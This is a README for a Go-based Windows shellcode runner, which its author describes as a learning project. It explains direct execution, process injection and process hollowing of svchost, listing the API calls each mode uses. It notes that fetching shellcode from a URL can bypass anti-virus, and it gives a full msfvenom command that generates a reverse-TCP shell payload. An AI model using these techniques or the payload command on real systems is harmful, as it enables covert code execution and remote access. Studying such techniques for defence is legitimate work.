# Golang (Windows) Shellcode Runner

A small project I put together to help me understand the concepts behind process injection, hollowing and running lots of win32 API calls directly from Go using just the syscall library.

Hopefully the code is easy to understand, even though its all this low level nonsense with uintptr etc.

## Specifying Shellcode

Shell code to run can be specified one of three ways: directly on the args via `-i`, from a file via `-f`, or from a url with `-u`. This last option is useful as the shellcode will never be written to disk, possibly bypassing anti-virus.

> Shellcode this has been tested with on Windows 11 was created with msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 PORT=4444 EXITFUNC=thread -f raw -o msfvenom_reversetcp_4444.txt` and then it was run via `-f msfvenom_reversetcp_4444.txt`.

## Modes of Operation

The shellcode can be run in one of three ways: directly, via process injection, or via process hollowing

### Direct Execution

This is the default option if `-p` or `-e` are not specified. The following APIs will be invoked:

- **VirtualAlloc** to create some memory space in the runner process
- **RtlMoveMemory** to copy the shellcode into this space
- **CreateThread** to start a thread to run the shellcode
- **WaitForSingleObject** to keep the process alive until the thread exits

This mode can be useful for debugging shellcode; add an `int3` to your assembly, attach to the runner process and go!

### Process Injection

Provide a process ID with `-p`. The process must be one you either created or otherwise have the writes to mess with. I tested with notepad, grabbing its PID from task manager.

The following APIs are invoked to run the shellcode inside the target process:

- **OpenProcess** to get the process information
- **VirtualAllocEx** to allocate some memory inside the process for the shellcode
- **WriteProcessMemory** to write the shellcode inside this space
- **CreateRemoteThread** to tell the process to run the shellcode with a new thread

The shellcode runner (this go project) doesn't need to be kept alive in this mode, and so will exit.

### Process Hollowing

Provide an executable path with `-e` - I tested using svchost, with the path `c:\\windows\\system32\\svchost.exe`. svchost in particular, if not run as system, will immediately exit when run. But process hollowing launches it suspended and then replaces its code with the shellcode, like a parasite :D

The following APIs are invoked in this mode:

- **CreateProcessA** to start a new process. The flag 0x4 is passed to start it suspended, just before it would run its code.
- **ZwQueryInformationProcess** to get the address of the process's PEB (process environment block)
- **ReadProcessMemory** to query the PEB for the image base address
- **ReadProcessMemory** again to read from the image base address (loading in the PE header for example)
- **WriteProcessMemory** to overwrite the memory from the code base address with shellcode
- **ResumeThread** to restart the suspended process, triggering the shellcode.

As with process injection, the go shellcode runner will exit once the thread is resumed.